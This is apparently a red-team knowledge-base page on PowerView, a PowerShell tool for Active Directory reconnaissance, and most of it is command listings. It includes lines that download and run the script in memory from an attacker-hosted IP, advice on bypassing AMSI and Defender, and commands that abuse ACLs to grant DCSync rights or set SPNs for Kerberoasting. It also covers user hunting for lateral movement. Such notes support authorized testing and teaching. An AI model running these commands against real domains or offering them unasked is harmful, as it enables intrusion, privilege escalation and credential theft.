---
title: "PowerView"
type: tool
tags: [active-directory, enumeration, powershell, acl, bloodhound, situational-awareness, windows]
date_created: 2026-07-02
date_updated: 2026-07-02
sources: [github-powersploit-powerview, harmj0y-powerview-tricks]
phase: recon
---

## Purpose

**PowerView** is a PowerShell tool for Active Directory enumeration and situational awareness. Originally part of PowerSploit and maintained by harmj0y, it enumerates users, groups, computers, GPOs, OUs, ACLs, trusts, shares, and logon sessions over LDAP and SMB without RSAT, and it finds attack paths (local admin access, user hunting, modifiable ACLs). It reads the same data BloodHound collects, but shines for targeted, quiet, single queries and for making changes (`Set-DomainObject`, `Add-DomainObjectAcl`).

## Installation

PowerView is a single `.ps1`. Load it reflectively (no disk) or import locally.

```powershell
# In-memory load from an attacker-hosted copy
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6/PowerView.ps1')
IEX (IWR http://10.10.14.6/PowerView.ps1 -UseBasicParsing)

# Local import
Import-Module .\PowerView.ps1
. .\PowerView.ps1
```

Use the "dev" branch (PowerView 3.0): its cmdlets are named `Get-Domain*` (the older 2.0 names like `Get-NetUser` remain as aliases). AMSI/Defender flags `PowerView.ps1`; pair it with an AMSI bypass or an obfuscated build.

## Core usage

Every `Get-Domain*` cmdlet accepts `-Domain`, `-Server` (target DC), and `-Credential` (run as another user without a new logon).

### Domain, users, computers, groups

```powershell
Get-Domain
Get-DomainController
Get-DomainPolicy

Get-DomainUser -Identity jdoe -Properties samaccountname,description,memberof
Get-DomainUser -SPN                      # kerberoastable accounts (have an SPN)
Get-DomainUser -PreauthNotRequired       # AS-REP roastable (no Kerberos pre-auth)
Get-DomainUser -LDAPFilter "(admincount=1)"

Get-DomainComputer -Properties dnshostname,operatingsystem
Get-DomainComputer -Unconstrained        # unconstrained delegation hosts
Get-DomainComputer -TrustedToAuth        # constrained delegation hosts

Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### GPOs, OUs, trusts

```powershell
Get-DomainGPO
Get-DomainGPO -ComputerIdentity WS01                  # GPOs applied to a computer
Get-DomainGPOLocalGroup                               # GPOs that set local group membership
Get-DomainGPOUserLocalGroupMapping -Identity jdoe     # where jdoe is a local admin via GPO
Get-DomainOU
Get-DomainTrust
Get-DomainTrustMapping                                # map every reachable trust
Get-ForestTrust
```

### ACLs (find and abuse rights)

```powershell
Get-DomainObjectAcl -Identity jdoe -ResolveGUIDs
Get-DomainObjectAcl -SearchBase "CN=Users,DC=corp,DC=local" -ResolveGUIDs

# Find principals with dangerous rights (GenericAll, WriteDACL, WriteOwner, etc.)
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -eq "jdoe" }

# Abuse a GenericAll/WriteDACL edge: grant DCSync rights, or set an SPN for targeted Kerberoast
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jdoe -Rights DCSync
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
```

`Get-ObjectAcl` is the older alias for `Get-DomainObjectAcl`. `-ResolveGUIDs` translates extended-right GUIDs (for example DS-Replication-Get-Changes) into readable names and is essential for spotting DCSync rights.

### Shares, files, sessions, local admin (hunting)

```powershell
Find-DomainShare -CheckShareAccess                    # readable shares across the domain
Find-InterestingDomainShareFile -Include *.config,*.xml,*.ps1

Get-NetSession -ComputerName FILE01                   # who has a session on this host
Get-NetLoggedOn -ComputerName WS01
Get-NetLocalGroupMember -ComputerName WS01 -GroupName Administrators

Find-LocalAdminAccess                                 # hosts where the current user is a local admin
Invoke-UserHunter -GroupName "Domain Admins"          # where target-group members are logged in
Invoke-UserHunter -CheckAccess                        # also flag hosts where you already have admin
```

### Run as another user

```powershell
$sec  = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\jdoe', $sec)
Get-DomainUser -Credential $cred
```

## Common use cases

- General AD enumeration and situational awareness: [[ad-enumeration]].
- Finding Kerberoast targets with `Get-DomainUser -SPN`: [[roasting-kerberoasting]].
- Finding AS-REP roast targets with `Get-DomainUser -PreauthNotRequired`: [[roasting-asrep-roasting]].
- ACL abuse discovery and weaponization (`Find-InterestingDomainAcl`, `Add-DomainObjectAcl`, `Set-DomainObject`): [[active-directory-access-controls-aclace]].
- GPO enumeration and local-group mapping (`Get-DomainGPO`, `Get-DomainGPOUserLocalGroupMapping`): [[active-directory-gpo]], [[active-directory-group-policy-objects]].
- Group membership enumeration (`Get-DomainGroup`, `Get-DomainGroupMember -Recurse`): [[active-directory-groups]].
- Share and sensitive-file hunting (`Find-DomainShare`, `Find-InterestingDomainShareFile`): [[internal-shares]].
- User hunting and local-admin mapping for lateral movement (`Invoke-UserHunter`, `Find-LocalAdminAccess`): [[ad-lateral-movement]].
- Delegation discovery (`Get-DomainComputer -Unconstrained` / `-TrustedToAuth`): [[kerberos-delegation-unconstrained-delegation]], [[kerberos-delegation-constrained-delegation]].
- Trust mapping toward cross-domain paths (`Get-DomainTrustMapping`): [[trust-relationship]].
- The same graph collected automatically: [[bloodhound]].

## Tips and gotchas

- Cmdlet naming: 2.0 uses `Get-Net*` (for example `Get-NetUser`), 3.0/dev uses `Get-Domain*` (for example `Get-DomainUser`). Aliases exist, but the dev branch is current; prefer it.
- AMSI/Defender flags `PowerView.ps1` on download and on import. Use an AMSI bypass, an obfuscated build, or run collection through SharpHound instead.
- `-ResolveGUIDs` is not optional for ACL work: without it, DCSync and other extended rights show as raw GUIDs and are easy to miss.
- `Invoke-UserHunter` touches many hosts (`Get-NetSession` / `Get-NetLoggedOn`) and is noisy; it can trip host-based detections.
- `Get-NetSession` returns nothing on hosts patched for the NetSessionEnum hardening (Windows 10 1709+ / Server 2019+). Fall back to `Get-NetLoggedOn`, remote registry, or event-log-based session data.
- Every `Get-Domain*` cmdlet takes `-Server <DC>` and `-Credential` for cross-domain enumeration and for querying as a different principal without spawning a new logon.
- BloodHound is usually better for path-finding; reach for PowerView when you want one quiet targeted query or when you need to make a change (`Set-DomainObject`, `Add-DomainObjectAcl`).

## Related

- [[bloodhound]] : automated collection and graph path-finding over the same data.
- [[ad-enumeration]] : the broader enumeration methodology PowerView supports.
- [[active-directory-access-controls-aclace]] : the ACL edges PowerView both finds and abuses.
- [[rubeus]] : consumes the roast targets and delegation hosts PowerView surfaces.

## Sources

- PowerSploit/PowerView (dev branch): https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon
- harmj0y, "PowerView: A Usage Guide" and the PowerView cheat sheet (blog.harmj0y.net)
